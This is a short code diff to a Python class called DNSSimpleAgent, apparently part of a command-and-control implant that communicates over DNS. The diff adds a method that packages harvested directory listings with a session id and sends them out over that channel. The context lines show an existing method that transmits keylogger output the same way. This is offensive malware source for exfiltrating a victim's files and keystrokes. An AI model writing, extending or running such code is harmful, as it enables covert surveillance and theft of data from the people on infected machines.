@@ -174,6 +174,13 @@ class DNSSimpleAgent(LocalAgent):
 		except Exception as e:
 			print("Oops, something went wrong with sendrecv: {}".format(e), file=sys.stderr)
 
+	def postDirHarvest(self, content, session_id):
+		try:
+			payload = "<dir_harv>" + str(session_id) + "<hv>" + content
+			decoded_resp = self.sendReceive(payload, self.dns_session_id)
+		except Exception as e:
+			print("Oops, something went wrong: {}".format(e), file=sys.stderr)
+
 	def postKeylogger(self, log):
 		transmission = "<keylogger>" + log
 		self.postResponse(transmission)
